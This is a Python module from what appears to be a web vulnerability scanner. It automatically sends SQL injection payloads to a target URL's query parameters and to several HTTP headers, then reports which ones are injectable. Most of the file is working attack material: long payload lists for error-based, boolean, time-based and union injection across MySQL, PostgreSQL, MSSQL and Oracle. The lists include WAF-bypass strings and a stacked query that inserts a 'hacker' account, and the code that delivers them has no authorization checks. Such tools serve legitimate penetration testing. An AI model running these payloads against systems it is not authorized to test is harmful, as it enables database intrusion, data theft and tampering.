import requests
import re
import time
import random
import json
import base64
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from colorama import Fore, Style
from core.config import Config
from core.engine import make_request
from concurrent.futures import ThreadPoolExecutor, as_completed
from difflib import SequenceMatcher
import hashlib

# Module information
description = "Advanced SQL Injection Testing Module with comprehensive payload sets and detection methods"
author = "LakshmikanthanK (@letchu_pkt)"
version = "2.1"


class SQLiTester:
    def __init__(self):
        self.config = Config()
        self.vulnerable_params = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Enhanced payloads
        self.error_based_payloads = [
            # Basic injection
            "'", '"', '`',
            
            # MySQL payloads
            "' OR 1=1 --",
            '" OR 1=1 --',
            "' OR 'a'='a",
            '" OR "a"="a',
            "' OR 1=1; --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
            "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --",
            "' UNION SELECT 1,version(),3,4 --",
            "' UNION SELECT null,concat(table_name),null FROM information_schema.tables WHERE table_schema=database() --",
            
            # PostgreSQL payloads
            "' AND CAST((SELECT version()) AS int) --",
            "' AND 1=CAST((SELECT current_database()) AS int) --",
            "' UNION SELECT null,version(),null --",
            
            # MSSQL payloads
            "' AND 1=CONVERT(int, (SELECT @@version)) --",
            "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --",
            "' UNION SELECT null,@@version,null,null --",
            
            # Oracle payloads
            "' AND 1=CAST((SELECT banner FROM v$version WHERE rownum=1) AS int) --",
            "' UNION SELECT null,banner FROM v$version WHERE rownum=1 --",
            
            # Generic union payloads
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
            "' UNION ALL SELECT null,null,null --",
            
            # Stacked queries
            "'; INSERT INTO users VALUES ('hacker','password') --",
            "'; WAITFOR DELAY '00:00:05' --",
            "'; SELECT pg_sleep(5) --",
            "'; SELECT SLEEP(5) --",
            
            # Blind injection payloads
            "' AND (SELECT SUBSTRING(@@version,1,1))='M' --",
            "' AND (SELECT SUBSTRING(user(),1,1))='r' --",
            "' AND (SELECT LENGTH(database()))>5 --",
            
            # WAF bypass attempts
            "/*!50000' OR 1=1 --*/",
            "' OR/**/1=1 --",
            "' OR(1)=1 --",
            "' OR`1`=1 --",
            "' OR 1=1%23",
            "' OR 1=1%00",
            "%27 OR 1=1 --",
            "0x27 OR 1=1 --"
        ]
        
        self.boolean_payloads = {
            'true': [
                "' OR 1=1 --",
                "' OR 'a'='a' --",
                "' OR 2>1 --",
                "') OR ('a'='a",
                "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 --"
            ],
            'false': [
                "' AND 1=2 --",
                "' AND 'a'='b' --",
                "' AND 2<1 --",
                "') AND ('a'='b",
                "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)<0 --"
            ]
        }
        
        self.time_based_payloads = [
            # MySQL
            "' AND SLEEP(5) --",
            "' AND (SELECT SLEEP(5) FROM users LIMIT 1) --",
            "' AND BENCHMARK(5000000, MD5(1)) --",
            
            # PostgreSQL
            "' AND pg_sleep(5) --",
            "'; SELECT pg_sleep(5) --",
            
            # MSSQL
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4, sysusers AS sys5) --",
            
            # Oracle
            "' AND (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3)>0 --",
            
            # Generic
            "' AND (SELECT*FROM(SELECT(SLEEP(5)))a) --"
        ]
        
        # Enhanced error patterns
        self.sql_error_patterns = [
            # MySQL
            r"mysql_fetch_array\(\)",
            r"mysql_fetch_assoc\(\)",
            r"mysql_fetch_object\(\)",
            r"mysql_numrows\(\)",
            r"Warning.*mysql_.*",
            r"MySQL server version",
            r"supplied argument is not a valid MySQL",
            r"Column count doesn't match value count",
            r"mysql_query\(\)",
            r"Unknown column '.*' in 'field list'",
            r"Table '.*' doesn't exist",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"invalid input syntax",
            r"column reference .* is ambiguous",
            
            # MSSQL
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"\bSQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark after",
            r"'80040e14'",
            
            # Oracle
            r"\bORA-[0-9][0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*",
            
            # General
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_query",
            r"valid MySQL result resource",
            r"check the manual that corresponds to your MySQL server version",
            r"unexpected end of SQL command",
            r"quoted string not properly terminated",
            r"syntax error at or near",
            r"unterminated quoted string",
            r"SQL command not properly ended",
            r"ORA-01756",
            r"Error Executing Database Query",
            r"SQLExecDirect",
            r"GetArray",
            r"FetchRow",
            r"Input string was not in a correct format"
        ]
        
        # Response analysis patterns
        self.sqli_indicators = [
            r"You have an error in your SQL syntax",
            r"Warning: mysql",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"ORA-\d+",
            r"Microsoft OLE DB Provider",
            r"ODBC Microsoft Access Driver",
            r"PostgreSQL query failed",
            r"Warning: pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning: sqlite_",
            r"SQLITE_ERROR",
            r"sqlite3.OperationalError",
            r"SQLSTATE\[HY000\]",
            r"Warning: PDO::",
            r"Error Executing Database Query"
        ]

    def get_baseline_response(self, url, params, parsed):
        """Get baseline response for comparison"""
        try:
            response = make_request(url)
            if response:
                return {
                    'content': response.text,
                    'status_code': response.status_code,
                    'length': len(response.text),
                    'hash': hashlib.md5(response.text.encode()).hexdigest(),
                    'headers': dict(response.headers)
                }
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error getting baseline: {e}{Style.RESET_ALL}")
        return None

    def inject_payload(self, url, params, parsed, param, payload, position='suffix'):
        """Inject payload in different positions"""
        test_params = params.copy()
        original_value = params[param][0] if params[param] else ""
        
        if position == 'suffix':
            test_value = original_value + payload
        elif position == 'prefix':
            test_value = payload + original_value
        elif position == 'replace':
            test_value = payload
        else:
            test_value = original_value + payload
        
        test_params[param] = [test_value]
        new_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        return make_request(test_url)

    def check_sql_errors(self, content):
        """Enhanced SQL error detection"""
        content_lower = content.lower()
        detected_errors = []
        
        for pattern in self.sql_error_patterns:
            matches = re.findall(pattern, content_lower, re.IGNORECASE)
            if matches:
                detected_errors.extend(matches)
        
        for pattern in self.sqli_indicators:
            if re.search(pattern, content, re.IGNORECASE):
                detected_errors.append(pattern)
        
        return detected_errors

    def similarity(self, a, b):
        """Calculate similarity between two strings"""
        return SequenceMatcher(None, a, b).ratio()

    def test_error_based(self, url, params, parsed, baseline):
        """Enhanced error-based SQL injection testing"""
        print(f"{Fore.CYAN}[*] Testing error-based SQL injection...{Style.RESET_ALL}")
        vulnerable_params = {}
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for i, payload in enumerate(self.error_based_payloads):
                try:
                    # Test different injection positions
                    for position in ['suffix', 'prefix', 'replace']:
                        response = self.inject_payload(url, params, parsed, param, payload, position)
                        
                        if not response:
                            continue
                        
                        errors = self.check_sql_errors(response.text)
                        if errors:
                            if param not in vulnerable_params:
                                vulnerable_params[param] = []
                            
                            vulnerable_params[param].append({
                                'type': 'error-based',
                                'payload': payload,
                                'position': position,
                                'errors': errors,
                                'response_length': len(response.text),
                                'status_code': response.status_code
                            })
                            
                            print(f"{Fore.GREEN}    [+] Vulnerable to error-based SQLi with payload: {payload[:50]}...{Style.RESET_ALL}")
                            break
                    
                    if param in vulnerable_params:
                        break
                        
                except Exception as e:
                    continue
        
        return vulnerable_params

    def test_boolean_based(self, url, params, parsed, baseline):
        """Enhanced boolean-based blind SQL injection testing"""
        print(f"{Fore.CYAN}[*] Testing boolean-based blind SQL injection...{Style.RESET_ALL}")
        vulnerable_params = {}
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            # Test multiple true/false payload pairs
            for true_payload in self.boolean_payloads['true']:
                for false_payload in self.boolean_payloads['false']:
                    try:
                        true_response = self.inject_payload(url, params, parsed, param, true_payload)
                        time.sleep(0.5)  # Avoid rate limiting
                        false_response = self.inject_payload(url, params, parsed, param, false_payload)
                        
                        if not true_response or not false_response:
                            continue
                        
                        # Compare responses
                        true_length = len(true_response.text)
                        false_length = len(false_response.text)
                        
                        # Check for significant differences
                        length_diff = abs(true_length - false_length)
                        status_diff = true_response.status_code != false_response.status_code
                        
                        # Check content similarity
                        similarity_score = self.similarity(true_response.text, false_response.text)
                        
                        if length_diff > 10 or status_diff or similarity_score < 0.95:
                            if param not in vulnerable_params:
                                vulnerable_params[param] = []
                            
                            vulnerable_params[param].append({
                                'type': 'boolean-based',
                                'true_payload': true_payload,
                                'false_payload': false_payload,
                                'length_difference': length_diff,
                                'status_difference': status_diff,
                                'similarity_score': similarity_score
                            })
                            
                            print(f"{Fore.GREEN}    [+] Vulnerable to boolean-based SQLi{Style.RESET_ALL}")
                            break
                    
                    except Exception as e:
                        continue
                
                if param in vulnerable_params:
                    break
        
        return vulnerable_params

    def test_time_based(self, url, params, parsed, baseline):
        """Time-based blind SQL injection testing"""
        print(f"{Fore.CYAN}[*] Testing time-based blind SQL injection...{Style.RESET_ALL}")
        vulnerable_params = {}
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            # Get baseline response time
            baseline_times = []
            for _ in range(3):
                start_time = time.time()
                response = make_request(url)
                if response:
                    baseline_times.append(time.time() - start_time)
                time.sleep(1)
            
            if not baseline_times:
                continue
            
            avg_baseline = sum(baseline_times) / len(baseline_times)
            
            for payload in self.time_based_payloads:
                try:
                    start_time = time.time()
                    response = self.inject_payload(url, params, parsed, param, payload)
                    response_time = time.time() - start_time
                    
                    if response and response_time > (avg_baseline + 4):  # At least 4 seconds delay
                        if param not in vulnerable_params:
                            vulnerable_params[param] = []
                        
                        vulnerable_params[param].append({
                            'type': 'time-based',
                            'payload': payload,
                            'response_time': response_time,
                            'baseline_time': avg_baseline,
                            'delay': response_time - avg_baseline
                        })
                        
                        print(f"{Fore.GREEN}    [+] Vulnerable to time-based SQLi (delay: {response_time - avg_baseline:.2f}s){Style.RESET_ALL}")
                        break
                
                except Exception as e:
                    continue
        
        return vulnerable_params

    def test_union_based(self, url, params, parsed, baseline):
        """Union-based SQL injection testing"""
        print(f"{Fore.CYAN}[*] Testing union-based SQL injection...{Style.RESET_ALL}")
        vulnerable_params = {}
        
        union_payloads = [
            "' UNION SELECT null--",
            "' UNION SELECT null,null--",
            "' UNION SELECT null,null,null--",
            "' UNION SELECT null,null,null,null--",
            "' UNION SELECT null,null,null,null,null--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT null,null,null--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name,null,null FROM information_schema.tables--"
        ]
        
        for param in params:
            print(f"  [*] Testing parameter: {param}")
            
            for payload in union_payloads:
                try:
                    response = self.inject_payload(url, params, parsed, param, payload)
                    
                    if not response:
                        continue
                    
                    # Look for union injection indicators
                    union_indicators = [
                        r"The used SELECT statements have a different number of columns",
                        r"UNION.*SELECT",
                        r"All queries combined using a UNION",
                        r"mixing of GROUP columns",
                        r"Operand should contain \d+ column"
                    ]
                    
                    for indicator in union_indicators:
                        if re.search(indicator, response.text, re.IGNORECASE):
                            if param not in vulnerable_params:
                                vulnerable_params[param] = []
                            
                            vulnerable_params[param].append({
                                'type': 'union-based',
                                'payload': payload,
                                'indicator': indicator,
                                'response_length': len(response.text)
                            })
                            
                            print(f"{Fore.GREEN}    [+] Vulnerable to union-based SQLi{Style.RESET_ALL}")
                            break
                
                except Exception as e:
                    continue
        
        return vulnerable_params

    def test_header_injection(self, url):
        """Test SQL injection in HTTP headers"""
        print(f"{Fore.CYAN}[*] Testing SQL injection in HTTP headers...{Style.RESET_ALL}")
        vulnerable_headers = {}
        
        headers_to_test = [
            'User-Agent', 'X-Forwarded-For', 'X-Real-IP', 'Referer',
            'X-Originating-IP', 'X-Remote-IP', 'X-Client-IP'
        ]
        
        test_payloads = ["'", '"', "' OR 1=1 --", '" OR 1=1 --']
        
        for header in headers_to_test:
            for payload in test_payloads:
                try:
                    headers = {header: payload}
                    response = requests.get(url, headers=headers, timeout=10)
                    
                    errors = self.check_sql_errors(response.text)
                    if errors:
                        if header not in vulnerable_headers:
                            vulnerable_headers[header] = []
                        
                        vulnerable_headers[header].append({
                            'payload': payload,
                            'errors': errors
                        })
                        
                        print(f"{Fore.GREEN}    [+] Header {header} vulnerable to SQLi{Style.RESET_ALL}")
                        break
                
                except Exception as e:
                    continue
        
        return vulnerable_headers

    def generate_detailed_report(self, results):
        """Generate detailed vulnerability report"""
        report = {
            'target': self.config.target,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': [],
            'summary': {
                'total_parameters_tested': 0,
                'vulnerable_parameters': 0,
                'vulnerability_types': set()
            }
        }
        
        for test_type, vulns in results.items():
            if test_type == 'headers':
                for header, vulns_list in vulns.items():
                    for vuln in vulns_list:
                        report['vulnerabilities'].append({
                            'type': 'header_injection',
                            'location': header,
                            'payload': vuln['payload'],
                            'errors': vuln['errors'],
                            'severity': 'High'
                        })
                        report['summary']['vulnerability_types'].add('header_injection')
            else:
                for param, vulns_list in vulns.items():
                    report['summary']['total_parameters_tested'] += 1
                    if vulns_list:
                        report['summary']['vulnerable_parameters'] += 1
                    
                    for vuln in vulns_list:
                        report['vulnerabilities'].append({
                            'type': vuln['type'],
                            'parameter': param,
                            'payload': vuln.get('payload', ''),
                            'details': vuln,
                            'severity': self.get_severity(vuln['type'])
                        })
                        report['summary']['vulnerability_types'].add(vuln['type'])
        
        report['summary']['vulnerability_types'] = list(report['summary']['vulnerability_types'])
        return report

    def get_severity(self, vuln_type):
        """Determine vulnerability severity"""
        severity_map = {
            'error-based': 'High',
            'union-based': 'High',
            'boolean-based': 'Medium',
            'time-based': 'Medium',
            'header_injection': 'High'
        }
        return severity_map.get(vuln_type, 'Medium')

def extract_parameters(url):
    """Extract parameters from URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return params, parsed

def run(target):
    """Main execution function"""
    print(f"{Fore.CYAN}[SQLi] Advanced SQL Injection Testing for {target}{Style.RESET_ALL}")
    
    try:
        tester = SQLiTester()
        
        # Extract parameters
        params, parsed = extract_parameters(target)
        if not params:
            print(f"{Fore.YELLOW}[-] No parameters found in URL for GET testing{Style.RESET_ALL}")
            # Still test headers even without URL parameters
            header_results = tester.test_header_injection(target)
            if header_results:
                print(f"{Fore.RED}[+] Found SQL injection in HTTP headers!{Style.RESET_ALL}")
                Config().add_result('sqli', f"Header injection found: {list(header_results.keys())}")
            else:
                Config().add_result('sqli', 'No SQL injection vulnerabilities found')
            return
        
        print(f"[*] Found {len(params)} parameters to test: {list(params.keys())}")
        
        # Get baseline response
        baseline = tester.get_baseline_response(target, params, parsed)
        
        # Run all tests
        results = {
            'error_based': tester.test_error_based(target, params, parsed, baseline),
            'boolean_based': tester.test_boolean_based(target, params, parsed, baseline),
            'time_based': tester.test_time_based(target, params, parsed, baseline),
            'union_based': tester.test_union_based(target, params, parsed, baseline),
            'headers': tester.test_header_injection(target)
        }
        
        # Generate comprehensive report
        report = tester.generate_detailed_report(results)
        
        # Display results
        total_vulns = len(report['vulnerabilities'])
        if total_vulns > 0:
            print(f"\n{Fore.RED}[+] Found {total_vulns} SQL injection vulnerabilities!{Style.RESET_ALL}")
            
            for vuln in report['vulnerabilities']:
                if vuln['type'] == 'header_injection':
                    print(f"  {Fore.RED}→ Header Injection{Style.RESET_ALL}: {vuln['location']} ({vuln['severity']})")
                else:
                    print(f"  {Fore.RED}→ {vuln['type'].title()}{Style.RESET_ALL}: {vuln['parameter']} ({vuln['severity']})")
            
            # Save detailed results
            Config().add_result('sqli', f"Found {total_vulns} vulnerabilities: {report['summary']['vulnerability_types']}")
            Config().add_result('sqli_detailed', json.dumps(report, indent=2))
        else:
            print(f"{Fore.GREEN}[-] No SQL injection vulnerabilities found{Style.RESET_ALL}")
            Config().add_result('sqli', 'No SQL injection vulnerabilities found')
    
    except Exception as e:
        print(f"{Fore.RED}[-] Error during SQL injection testing: {e}{Style.RESET_ALL}")
        Config().add_result('sqli', f'Error during testing: {str(e)}')